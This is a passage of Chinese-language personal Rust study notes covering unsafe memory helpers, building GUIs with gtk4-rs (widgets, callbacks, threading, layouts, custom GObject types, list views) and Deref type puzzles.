<div style="break-before: page; page-break-before: always;"></div><h1 id="unsafe最佳实践"><a class="header" href="#unsafe最佳实践">Unsafe最佳实践</a></h1>
<p>unsafe的意思是程序员需要自己保证内存安全，而不是让编译器来保证，不是不安全的意思。</p>
<p>unsafe的范围越小越好。</p>
<p>尽量将unsafe进行安全的封装。</p>
<h2 id="stdmem1"><a class="header" href="#stdmem1">std::mem<sup class="footnote-reference"><a href="#mem">1</a></sup></a></h2>
<p>很多时候我们想要自己手动的去控制内存，就会涉及到unsafe了。另外Rust并不把内存泄漏作为safety的保证，所以这里介绍的一些接口可能是safe的，但是使用不当非常容易造成内存泄漏。</p>
<p>我们知道，Rust的所有权机制保证拥有所有权的变量在结束他的生命周期之后，会自动调用<code>Drop</code>。但是，用<code>ManuallyDrop</code>封装之后，就不会再自动去调用<code>Drop</code>了，你应该手动的去释放对应的资源。（他是一个0开销的封装）</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn leak(string: String) {
    use std::mem::ManuallyDrop;
    let x = ManuallyDrop::new(string);
    // `x`'s `Drop` will not be run here
}
<span class="boring">}
</span></code></pre></pre>
<p>与之类似的是<code>forget</code>方法，不过他会同时结束变量的生命周期，你之后就不能再使用变量了。</p>
<p>如果在获取一块内存的时候没有全部初始化，那么你就需要自己去保证他之后被初始化了才可以读取。一块未初始化的内存，被读取可能导致信息的泄漏，导致程序执行本不应该执行的代码等等，是很危险的。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut x = MaybeUninit::&lt;&amp;i32&gt;::uninit();
x.write(&amp;1);
unsafe {
  assert_eq!(1, *x.assume_init_read());
}
<span class="boring">}
</span></code></pre></pre>
<div class="footnote-definition" id="mem"><sup class="footnote-definition-label">1</sup>
<p>https://doc.rust-lang.org/std/mem/index.html</p>
</div>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rust-gtk-rs介绍"><a class="header" href="#rust-gtk-rs介绍">Rust-gtk-rs介绍</a></h1>
<p>参考文档: &lt;精通Rust(第二版)&gt;,<a href="https://docs.gtk.org/gtk4/">Gtk – 4.0</a>,<a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/index.html">gtk4 - Rust</a>,<a href="https://gtk-rs.org/gtk4-rs/stable/latest/book/">GUI development with Rust and GTK 4</a>,<a href="https://docs.gtk.org/gtk4/visual_index.html">Gtk – 4.0: Widget Gallery</a></p>
<p><a href="http://ssalewski.de/gtkprogramming.html#_gtkgrid">gtkgrid</a></p>
<h2 id="api总体介绍"><a class="header" href="#api总体介绍">API总体介绍</a></h2>
<h3 id="框架-demo"><a class="header" href="#框架-demo">框架 Demo</a></h3>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // Create a new application
    let app = Application::builder()
        .application_id(&quot;org.gtk.example&quot;)
        .build();

    // Connect to &quot;activate&quot; signal of `app`
    app.connect_activate(move |app| {
        let window = GtkCommunicateWindow::init(app);
        window.window.present();
    });

    // Run the application
    app.run();
}

#[derive(Clone)]
struct GtkCommunicateWindow {
    application: gtk::Application,
    pub window: gtk::ApplicationWindow,
    input_text: gtk::TextView,
    output_text: gtk::TextView,
    list_text: gtk::TextView,

    send_button: gtk::Button,
    time_button: gtk::Button,
    name_button: gtk::Button,

    input_addrport: gtk::TextView,
    refresh_button: gtk::Button,
}
</code></pre></pre>
<h3 id="创建一个widget"><a class="header" href="#创建一个widget">创建一个Widget</a></h3>
<p>可以用类C语言风格的API,如下</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let app = Application::new(None, ApplicationFlags::FLAGS_NONE);
app.set_application_id(Some(&quot;org.gtk.example&quot;));

let window = ApplicationWindow::new(&amp;app);
window.set_title(Some(&quot;My GTK App&quot;));
<span class="boring">}
</span></code></pre></pre>
<p>但是更优雅的做法是使用“建造者模式”风格的API.</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let app = Application::builder()
	.application_id(&quot;org.gtk.example&quot;)
	.build();

let window = ApplicationWindow::builder()
        .application(&amp;app)
        .title(&quot;My GTK App&quot;)		
        .build();
<span class="boring">}
</span></code></pre></pre>
<h3 id="callback-function-star"><a class="header" href="#callback-function-star">callback function :star:</a></h3>
<p>比如,我们要为``button<code>的</code>click`动作,关联一个回调函数.在C语言中是这样</p>
<pre><code class="language-c">g_signal_connect (G_OBJECT (button), &quot;clicked&quot;, G_CALLBACK (click_button), NULL);
</code></pre>
<p>而在Rust的绑定中会显得简单,毕竟C并不是面向对象的语言.而Rust是具有面向对象的特性的.</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// button: Button
button.connect_clicked(move |button| {
        // Set the label to &quot;Hello World!&quot; after the button has been clicked on
        button.set_label(&quot;Hello World!&quot;);
    });
<span class="boring">}
</span></code></pre></pre>
<p>Rust风格的绑定回调函数是<code>connect_&lt;method&gt;</code>, 然后参数是一个函数. 这种简单的函数用closure就挺好的. 也可以顺便查看一下源码如下,不难发现这就是一个对C语言函数的封装. <code>connect_raw</code>就是<code>g_signal_connect</code>.</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn connect_clicked&lt;F: Fn(&amp;Self) + 'static&gt;(&amp;self, f: F) -&gt; SignalHandlerId {
        unsafe extern &quot;C&quot; fn clicked_trampoline&lt;P: IsA&lt;Button&gt;, F: Fn(&amp;P) + 'static&gt;(
            this: *mut ffi::GtkButton,
            f: glib::ffi::gpointer,
        ) {
            let f: &amp;F = &amp;*(f as *const F);
            f(Button::from_glib_borrow(this).unsafe_cast_ref())
        }
        unsafe {
            let f: Box_&lt;F&gt; = Box_::new(f);
            connect_raw(
                self.as_ptr() as *mut _,
                b&quot;clicked\0&quot;.as_ptr() as *const _,
                Some(transmute::&lt;_, unsafe extern &quot;C&quot; fn()&gt;(
                    clicked_trampoline::&lt;Self, F&gt; as *const (),
                )),
                Box_::into_raw(f),
            )
        }
    }
<span class="boring">}
</span></code></pre></pre>
<p>一个需要注意的问题是, callback function默认是和主线程一起的. 也就是说, 如果回调函数特别复杂,那么整个界面就卡住了. 这是我们不希望看见的.</p>
<p>我原本以为只需要把回调函数变成一个新建的线程就可以解决问题,像下面这样. 但是编译器会告诉你“<code>NonNull&lt;GObject&gt;</code> cannot be shared between threads safely within <code>gtk4::Button</code>, the trait <code>Sync</code> is not implemented for <code>NonNull&lt;GObject&gt;</code> required because of the requirements on the impl of <code>Send</code> for <code>&amp;gtk4::Button</code>”.  其实,GTK is not thread-safe. Accordingly, none of this crate’s structs implement <a href="https://doc.rust-lang.org/nightly/core/marker/trait.Send.html"><code>Send</code></a> or <a href="https://doc.rust-lang.org/nightly/core/marker/trait.Sync.html"><code>Sync</code></a>. 所以就不要想着简单的把GTK的widget传入新建的线程了,都放在主线程渲染吧. 不过这样也不是完全不能解决问题, 你可以把和widget无关的复杂逻辑放进线程中,再和主线程通信一下(也许可以吧)</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>button.connect_clicked(move |button| {
        // Set the label to &quot;Hello World!&quot; after the button has been clicked on
        thread::spawn(move||{
            button.set_label(&quot;Hello World!&quot;); // can be outside the child thread
            loop{}
        });
    });
<span class="boring">}
</span></code></pre></pre>
<p>还有另外一种解决方案, 参考https://gtk-rs.org/gtk4-rs/stable/latest/book/main_event_loop.html. 注意</p>
<ul>
<li><code>spawn_local</code> 使用的感觉就像创建了一个子线程, 但是实际上还是主线程. 这样有一个好处就是避免了跨线程传递数据的问题, 可以把<code>GObject</code>传给闭包. </li>
<li>所以我们如何选择创建一个子线程还是<code>spawn_local</code>呢? 
<ul>
<li>If you have <code>async</code> functions for your IO-bound operations at your disposal, feel free to spawn them on the main loop.</li>
<li>If your operation is computation-bound or there is no <code>async</code> function available, you have to spawn threads.</li>
</ul>
</li>
<li><code>channel</code>可以给receiver attach一个处理传递来数据的闭包. 虽然我不知道这个是怎么实现的, 让我自己实现会用轮询. 不过这个功能确实很好用. </li>
<li><code>clone!</code>宏可以避免写很多东西, 但是我还不太了解.所以我都是手动clone.</li>
</ul>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let (sender, receiver) = MainContext::channel(PRIORITY_DEFAULT);
    // Connect to &quot;clicked&quot; signal of `button`
    button.connect_clicked(move |_| {
        let main_context = MainContext::default();
        // The main loop executes the asynchronous block
        main_context.spawn_local(clone!(@strong sender =&gt; async move {
            // Deactivate the button until the operation is done
            sender.send(false).expect(&quot;Could not send through channel&quot;);
            timeout_future_seconds(5).await;
            // Activate the button again
            sender.send(true).expect(&quot;Could not send through channel&quot;);
        }));
    });

    // The main loop executes the closure as soon as it receives the message
    receiver.attach(
        None,
        clone!(@weak button =&gt; @default-return Continue(false),
                    move |enable_button| {
                        button.set_sensitive(enable_button);
                        Continue(true)
                    }
        ),
    );
<span class="boring">}
</span></code></pre></pre>
<h3 id="常用的widget-functions"><a class="header" href="#常用的widget-functions">常用的Widget functions</a></h3>
<ul>
<li><code>destroy</code>:  通常只被 top-level widgets 使用. It is usually only used to destroy dialog windows and to implement menu items that quit the application.</li>
<li><code>set_width_request</code>和<code>set_height_request</code>: 顾名思义, 设置widget的宽和高</li>
<li><code>set_sensitive(bool)</code>: 让widget处于激活/非激活状态.</li>
</ul>
<p>详细请参考: https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/prelude/trait.WidgetExt.html</p>
<h3 id="layoutmanager"><a class="header" href="#layoutmanager">LayoutManager</a></h3>
<p>LayoutManager的主要目的是为了让parent widget 有多个children. 在GTK有两种类型的container, 用于 laying out children  and decorators and those that add some sort of functionality beyond positioning to a child.看了一下,大致有</p>
<ul>
<li><a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.BinLayout.html"><code>BinLayout</code></a> is a <a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.LayoutManager.html"><code>LayoutManager</code></a> subclass useful for create “bins” of widgets.<a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.BinLayout.html"><code>BinLayout</code></a> will stack each child of a widget on top of each other.</li>
<li><a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.BoxLayout.html"><code>BoxLayout</code></a> is a layout manager that arranges children in a single row or column.</li>
<li><a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.CellLayout.html"><code>CellLayout</code></a> is an interface to be implemented by all objects which want to provide a <a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.TreeViewColumn.html"><code>TreeViewColumn</code></a> like API for packing cells, setting attributes and data funcs.</li>
<li><a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.CenterLayout.html"><code>CenterLayout</code></a> is a layout manager that manages up to three children.</li>
<li><a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.ConstraintLayout.html"><code>ConstraintLayout</code></a> is a layout manager that uses relations between widget attributes, expressed via <a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.Constraint.html"><code>Constraint</code></a> instances, to measure and allocate widgets.</li>
<li><a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.FixedLayout.html"><code>FixedLayout</code></a> is a layout manager which can place child widgets at fixed positions.</li>
<li><a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.GridLayout.html"><code>GridLayout</code></a> is a layout manager which arranges child widgets in rows and columns.</li>
</ul>
<p>所以我们需要如何使用LayoutManager呢?</p>
<ol>
<li>
<p>每一个widget只可以属于一个LayoutManger, 我们通过<code>WidgetExt::set_layout_manager&lt;P: IsA&lt;LayoutManager&gt;&gt;(&amp;self, layout_manager: Option&lt;&amp;P&gt;);</code>设置widget的LayoutManager.</p>
</li>
<li>
<p>我们好像不直接使用LayoutManager. </p>
<div class="table-wrapper"><table><thead><tr><th>LayoutManager</th><th>Widget</th></tr></thead><tbody>
<tr><td>BinLayout</td><td>Bin</td></tr>
<tr><td>BoxLayout</td><td>gtk4::Box(这个容易引起误会)</td></tr>
<tr><td>CenterLayout</td><td><a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.CenterBox.html">CenterBox</a></td></tr>
<tr><td>ConstraintLayout</td><td>Constraint</td></tr>
<tr><td>FixedLayout</td><td>Fixed</td></tr>
<tr><td>GridLayout</td><td><a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/gtk4/struct.Grid.html">Grid</a></td></tr>
</tbody></table>
</div></li>
</ol>
<p>那么我们可以这样:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let container = CenterBox::builder().build();

let b1 = Button::builder().label(&quot;Center&quot;).build();
let b2 = Button::builder().label(&quot;Start&quot;).build();
let b3 = Button::builder().label(&quot;End&quot;).build();
container.set_center_widget(Some(&amp;b1));
container.set_start_widget(Some(&amp;b2));
container.set_end_widget(Some(&amp;b3));

// button.set_sensitive(false)
window.set_child(Some(&amp;container));
<span class="boring">}
</span></code></pre></pre>
<h3 id="继承关系"><a class="header" href="#继承关系">继承关系</a></h3>
<p>使用container碰到的一个问题, 写下面的代码时候, 编译器提示说container不是Widget(the trait <code>IsA&lt;gtk4::Widget&gt;</code> is not implemented for <code>BoxLayout</code>), <code>set_child</code>这个函数只能接受Widget的参数. 的确, LayoutManager不是Widget, 可以参考<a href="https://docs.gtk.org/gtk4/classes_hierarchy.html">GTK的Class继承关系</a>. </p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>window.set_child(Some(&amp;container));
<span class="boring">}
</span></code></pre></pre>
<p>我们知道<a href="https://docs.gtk.org/gtk4/classes_hierarchy.html">GTK的Class继承关系</a>. 那么我们在Rust中是如何体现这个继承关系的呢?就是这个<a href="https://docs.rs/glib/0.14.5/glib/object/trait.IsA.html"><code>IsA&lt;T&gt;</code></a>. <code>IsA</code>是一个Unsafe Paradigm Trait, 并且继承于<code>ObjectType+AsRef&lt;T&gt;+'static</code>. 他没有方法, 也就是说只是一个标记.</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub unsafe trait IsA&lt;T: ObjectType&gt;: ObjectType + AsRef&lt;T&gt; + 'static { }
<span class="boring">}
</span></code></pre></pre>
<p>复习一下Rust知识, A trait is unsafe when at least one of its methods has some invariant that the compiler can’t verify. 继承的意思是说, impl <code>IsA</code>的类型必须同时 impl <code>ObjectType+AsRef&lt;T&gt;+'static</code>.</p>
<p>那么光靠这个标记我们是怎么确定类的继承关系的呢? 以Button为例, Button满足如下<code>IsA&lt;T&gt;</code>. <a href="https://gtk-rs.org/gtk4-rs/stable/latest/docs/src/gtk4/auto/button.rs.html#26-65">代码的实现借助了宏</a>.</p>
<pre><code>impl IsA&lt;Accessible&gt; for Button
impl IsA&lt;Actionable&gt; for Button
impl IsA&lt;Buildable&gt; for Button
impl IsA&lt;Button&gt; for LinkButton
impl IsA&lt;Button&gt; for LockButton
impl IsA&lt;Button&gt; for ToggleButton
impl IsA&lt;ConstraintTarget&gt; for Button
impl IsA&lt;Widget&gt; for Button
</code></pre>
<h4 id="创建自定义类型"><a class="header" href="#创建自定义类型">创建自定义类型</a></h4>
<p>我们有时可能会想要创建自定义的类型, 如下, 我们创建了一个自定义Button.</p>
<ul>
<li>这里的<code>ObjectImpl</code>,<code>WidgetImpl</code>和<code>ButtonImpl</code>都是空的, 因为他们有默认实现. 如果你需要一些自定义的功能也可以去实现.</li>
<li><code>glib::wrapper!</code>宏定义了一个新的类型. 我们在使用的时候无视<code>_CustomButton</code>, 只使用<code>CustomButton</code>.</li>
</ul>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use gtk::glib;
use gtk::subclass::prelude::*;
use glib::Object;
use gtk::glib;

// Object holding the state
#[derive(Default)]
pub struct _CustomButton;
// The central trait for subclassing a GObject
#[glib::object_subclass]
impl ObjectSubclass for _CustomButton {
    const NAME: &amp;'static str = &quot;MyGtkAppCustomButton&quot;;
    type Type = super::CustomButton;
    type ParentType = gtk::Button;
}
// Trait shared by all GObjects
impl ObjectImpl for _CustomButton {}
// Trait shared by all widgets
impl WidgetImpl for _CustomButton {}
// Trait shared by all buttons
impl ButtonImpl for _CustomButton {}

glib::wrapper! {
    pub struct CustomButton(ObjectSubclass&lt;_CustomButton&gt;)
        @extends gtk::Button, gtk::Widget,
        @implements gtk::Accessible, gtk::Actionable, gtk::Buildable, gtk::ConstraintTarget;
}

impl CustomButton {
    pub fn new() -&gt; Self {
        Object::new(&amp;[]).expect(&quot;Failed to create `CustomButton`.&quot;)
    }

    pub fn with_label(label: &amp;str) -&gt; Self {
        Object::new(&amp;[(&quot;label&quot;, &amp;label)]).expect(&quot;Failed to create `CustomButton`.&quot;)
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="xml-2"><a class="header" href="#xml-2">XML</a></h3>
<p>很多GUI框架都允许我们使用markup来定义布局, 比如我们熟悉的HTML+CSS. GTK并不例外.  参考https://gtk-rs.org/gtk4-rs/stable/latest/book/interface_builder.html</p>
<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;interface&gt;
  &lt;object class=&quot;GtkApplicationWindow&quot; id=&quot;window&quot;&gt;
    &lt;property name=&quot;title&quot;&gt;My GTK App&lt;/property&gt;
    &lt;child&gt;
      &lt;object class=&quot;GtkButton&quot; id=&quot;button&quot;&gt;
        &lt;property name=&quot;label&quot;&gt;Press me!&lt;/property&gt;
        &lt;property name=&quot;margin-top&quot;&gt;12&lt;/property&gt;
        &lt;property name=&quot;margin-bottom&quot;&gt;12&lt;/property&gt;
        &lt;property name=&quot;margin-start&quot;&gt;12&lt;/property&gt;
        &lt;property name=&quot;margin-end&quot;&gt;12&lt;/property&gt;  
      &lt;/object&gt;
    &lt;/child&gt;
  &lt;/object&gt;
&lt;/interface&gt;
</code></pre>
<p>这个XML文件独立于代码. 那么我们应该如何在代码中实例化XML定义的组件呢?</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn build_ui(app: &amp;Application) {
    // Init `gtk::Builder` from file
    let builder = gtk::Builder::from_string(include_str!(&quot;window.ui&quot;));

    // Get window and button from `gtk::Builder`
    let window: ApplicationWindow = builder
        .object(&quot;window&quot;)
        .expect(&quot;Could not get object `window` from builder.&quot;);
    let button: Button = builder
        .object(&quot;button&quot;)
        .expect(&quot;Could not get object `button` from builder.&quot;);

    // Set application
    window.set_application(Some(app));

    // Connect to &quot;clicked&quot; signal
    button.connect_clicked(move |button| {
        // Set the label to &quot;Hello World!&quot; after the button has been clicked on
        button.set_label(&quot;Hello World!&quot;);
    });

    // Add button
    window.set_child(Some(&amp;button));
    window.present();
}
<span class="boring">}
</span></code></pre></pre>
<p>链接还介绍了一种更简单的办法.</p>
<h2 id="常用widget介绍"><a class="header" href="#常用widget介绍">常用widget介绍</a></h2>
<h3 id="gtkgrid"><a class="header" href="#gtkgrid">gtk::Grid</a></h3>
<p>网格布局, 在之前的gtk3中table是类似的东西, 但是在gtk4被depreciated了.</p>
<ul>
<li>通过<code>attach</code>增加child,<code>remove</code>删除child.</li>
</ul>
<h3 id="gioliststore"><a class="header" href="#gioliststore">gio::ListStore</a></h3>
<p>我们经常有需求需要把一些信息按列显示, 这就是<code>List</code>派上用场的地方. 虽然有更简单的<code>ListBox</code>, 但是建议使用:</p>
<ul>
<li>The <strong>model</strong> holds our data, filters it and describes its order.</li>
<li>The <strong>list item factory</strong> defines how the data transforms into widgets.</li>
<li>The <strong>view</strong> specifies how the widgets are then arranged.</li>
</ul>
<p>参考https://gtk-rs.org/gtk4-rs/stable/latest/book/lists.html</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// ListSotre: 保存我们数据的model. 参数是GObject的类型
let list_store = gio::ListStore::new(list::ClientObject::static_type());
// SignalListItemFactory: 
let factory = gtk::SignalListItemFactory::new();
factory.connect_setup(move |_, list_item| {
    let label = gtk::Label::new(None);
    list_item.set_child(Some(&amp;label));
});
factory.connect_bind(move |_, list_item| {
    // Get `ClientObject` from `ListItem`
    let client_object = list_item
    .item()
    .expect(&quot;The item has to exist.&quot;)
    .downcast::&lt;list::ClientObject&gt;()
    .expect(&quot;The item has to be an `ClientObject`.&quot;);

    // Get `i32` from `ClientObject`
    let no = client_object
    .property(&quot;no&quot;)
    .expect(&quot;The property needs to exist and be readable.&quot;)
    .get::&lt;i32&gt;()
    .expect(&quot;The property needs to be of type `i32`.&quot;);

    // Get `String` from `ClientObject`
    let addr = client_object
    .property(&quot;addr&quot;)
    .expect(&quot;The property needs to exist and be readable.&quot;)
    .get::&lt;String&gt;()
    .expect(&quot;The property needs to be of type `String`.&quot;);

    // Get `Label` from `ListItem`
    let label = list_item
    .child()
    .expect(&quot;The child has to exist.&quot;)
    .downcast::&lt;gtk::Label&gt;()
    .expect(&quot;The child has to be a `Label`.&quot;);

    // Set &quot;label&quot; to &quot;no:addr&quot;
    label.set_label(&amp;format!(&quot;no:{}\naddr:{}&quot;, no, addr));
});
// 这是单选
let selection_model = gtk::SingleSelection::new(Some(&amp;list_store));

let list_view = gtk::ListView::new(Some(&amp;selection_model), Some(&amp;factory));
// 滚动
let list_scrolled_window = gtk::ScrolledWindowBuilder::new()
    .child(&amp;list_view)
    .hscrollbar_policy(gtk::PolicyType::Never)
    .vscrollbar_policy(gtk::PolicyType::Automatic)
    .hexpand(true)
    .vexpand(true)
    .margin_start(1)
    .margin_end(1)
    .build();
<span class="boring">}
</span></code></pre></pre>
<p>需要注意的是, <code>gio::ListStore</code> only accepts GObjects. 所以我们需要创建一个GObject的子类来存储数据. </p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use glib::{ParamFlags, ParamSpec, Value};
use gtk::glib;
use gtk::prelude::*;
use gtk::subclass::prelude::*;
use once_cell::sync::Lazy;
use std::cell::Cell;
use std::cell::RefCell;
use glib::Object;

// Object holding the state
#[derive(Default)]
pub struct _ClientObject {
    no: Cell&lt;i32&gt;,
    addr: RefCell&lt;String&gt;,
}

// The central trait for subclassing a GObject
#[glib::object_subclass]
impl ObjectSubclass for _ClientObject {
    const NAME: &amp;'static str = &quot;MyGtkAppClientObject&quot;;
    type Type = ClientObject;
    type ParentType = glib::Object;
}

// Trait shared by all GObjects
impl ObjectImpl for _ClientObject {
    fn properties() -&gt; &amp;'static [ParamSpec] {
        static PROPERTIES: Lazy&lt;Vec&lt;ParamSpec&gt;&gt; = Lazy::new(|| {
            vec![
                ParamSpec::new_int(
                    // Name
                    &quot;no&quot;,
                    // Nickname
                    &quot;no&quot;,
                    // Short description
                    &quot;no&quot;,
                    // Minimum value
                    i32::MIN,
                    // Maximum value
                    i32::MAX,
                    // Default value
                    0,
                    // The property can be read and written to
                    ParamFlags::READWRITE,
                ),
                ParamSpec::new_string(&quot;addr&quot;, &quot;addr&quot;, &quot;addr&quot;, None, ParamFlags::READWRITE),
            ]
        });
        PROPERTIES.as_ref()
    }

    fn set_property(&amp;self, _obj: &amp;Self::Type, _id: usize, value: &amp;Value, pspec: &amp;ParamSpec) {
        match pspec.name() {
            &quot;no&quot; =&gt; {
                let input_no = value.get().expect(&quot;The value needs to be of type `i32`.&quot;);
                self.no.replace(input_no);
            },
            &quot;addr&quot; =&gt; {
                let input_addr = value.get().expect(&quot;The value needs to be of type `String`.&quot;);
                self.addr.replace(input_addr);
            }
            _ =&gt; unimplemented!(),
        }
    }

    fn property(&amp;self, _obj: &amp;Self::Type, _id: usize, pspec: &amp;ParamSpec) -&gt; Value {
        match pspec.name() {
            &quot;no&quot; =&gt; self.no.get().to_value(),
            &quot;addr&quot; =&gt; {self.addr.borrow().clone().to_value()}
            _ =&gt; unimplemented!(),
        }
    }
}

glib::wrapper! {
    pub struct ClientObject(ObjectSubclass&lt;_ClientObject&gt;);
}

impl ClientObject {
    pub fn new(no: i32,addr: String) -&gt; Self {
        Object::new(&amp;[(&quot;no&quot;, &amp;no),(&quot;addr&quot;,&amp;addr)]).expect(&quot;Failed to create `ClientObject`.&quot;)
    }   
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="gtktextview"><a class="header" href="#gtktextview">gtk::TextView</a></h3>
<p>输入框, 你也可以禁止输入然后就可以用来显示了.</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 创建
let input_addrport = gtk::TextView::builder()
            .editable(true)
            .monospace(true)
            .accepts_tab(false)
            .tooltip_text(&quot;ip:port&quot;)
            .build();
// 获取输入的字符串
let (start, end) = input_addrport.buffer().bounds();
let addr = input_addrport
	.buffer()
	.text(&amp;start, &amp;end, false)
	.to_string();
// 更改显示的字符串
output_text.buffer().set_text(&amp;output_buffer);
<span class="boring">}
</span></code></pre></pre>
<h2 id="代码细节"><a class="header" href="#代码细节">代码细节</a></h2>
<h3 id="闭包-3"><a class="header" href="#闭包-3">闭包</a></h3>
<p>因为想让回调函数中的复杂逻辑以子线程的方式完成, 所以有了下面的代码. 但是编译器提示你</p>
<blockquote>
<p>cannot move out of <code>tcp_w</code>, a captured variable in an <code>Fn</code> closure move out of <code>tcp_w</code></p>
</blockquote>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>{
    ...
    let tcp_w = TCP_W.clone();
    time_button.connect_clicked(move |_| {
        thread::spawn(move || {
            if let Some(tcp_w) = tcp_w.lock().unwrap().as_mut() {
                tcp_w.request_time();
            };
        });
    });
    ...
}
<span class="boring">}
</span></code></pre></pre>
<p>回顾Rust函数闭包, 有三种类型, 将<code>f(a,b,c)</code>变成</p>
<ul>
<li><code>Fn::call(&amp;f,a,b,c)</code> 可以调用多次</li>
<li><code>FnMut::call(&amp;mut f,a,b,c)</code></li>
<li><code>FnOnce::call(f,a,b,c)</code> 会转移方法接收者的所有权, 也就是说只能调用一次</li>
</ul>
<p>所以, 像上面的错误代码, thread就调用一次之后, tcp_w的生命就结束了.不能调用第二次了. </p>
<p>另外, 为什么需要move关键字呢? 如果我们不使用move关键字, 那么当函数结束的时候, <code>tcp_w</code>就被drop了,但是我们的函数闭包会一直需要<code>tcp_w</code>(因为我们怎么知道什么时候按钮会被点击呢?).所以, 要么通过move直接吧ownership也移动进闭包, 要么传递一个生命周期为<code>‘static</code>的引用.</p>
<h3 id="gobject"><a class="header" href="#gobject">GObject</a></h3>
<p>A GObject (or <code>glib::Object</code> in Rust terms) is a reference-counted, mutable object.</p>
<blockquote>
<p><code>NonNull&lt;GObject&gt;</code> cannot be sent between threads safely within <code>[closure@src/main.rs:237:35: 255:22]</code>, the trait <code>Send</code> is not implemented for <code>NonNull&lt;GObject&gt;</code></p>
</blockquote>
<p>如果你试图把gtk中的类传递给别的线程, 会给出如上的错误. 错误的原因是GObject并不能安全的跨线程传输. 所以在编程的时候, 可以把组件渲染的逻辑放在主线程, 其他逻辑放在子线程, 用一些方法传递数据. </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="函数参数匹配"><a class="header" href="#函数参数匹配">函数参数匹配</a></h1>
<p>这算是把我搞晕了。</p>
<pre><code>let x = &quot;hello&quot;.to_string();
let z = &amp;&amp;(x.deref());
let z = &amp;(&amp;x).deref();
let z = (&amp;&amp;x).deref();
let z = &amp;*&amp;x;
let z = &amp;&amp;*x;
let z = *&amp;&amp;x;
</code></pre>
<p>这些都是什么类型呢？</p>
<p><img src="Language/Rust/../images/image-20210726170510387.png" alt="image-20210726170510387" /></p>
<p>从简单的入手：</p>
<h2 id="stringderef"><a class="header" href="#stringderef">String.deref()</a></h2>
<p>源代码如下：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[stable(feature = &quot;rust1&quot;, since = &quot;1.0.0&quot;)]
impl ops::Deref for String {
    type Target = str;

    #[inline]
    fn deref(&amp;self) -&gt; &amp;str {
        unsafe { str::from_utf8_unchecked(&amp;self.vec) }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>我们在调用<code>x.deref</code>的时候，因为<code>String</code>并没有一个方法签名是<code>fn deref(self) -&gt; xxx</code> ，所以我们其实调用的是<code>(&amp;x).deref</code>，也就是说<code>&amp;String.deref</code>。因为String impl 了Deref Trait，无论是<code>x.deref</code>还是<code>(&amp;x).deref</code>，我们得到的就都是<code>&amp;str</code>。</p>
<p>这可以解决11/12行的结果。</p>
<h2 id="-1"><a class="header" href="#-1">*</a></h2>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Deref {
    type Target: ?Sized;
    #[must_use]
    fn deref(&amp;self) -&gt; &amp;Self::Target;
}
<span class="boring">}
</span></code></pre></pre>
<p><code>*</code>这个操作符得到的其实是上面介绍的<code>Target</code>的类型。而<code>deref</code>返回的类型是<code>&amp;Target</code>。有关系，但并不是等价的！<code>x.deref == &amp;*x</code>才是的。</p>
<p>所以<code>*x</code>得到的是<code>str</code>，所以第19行得到的是<code>&amp;&amp;str</code>。</p>
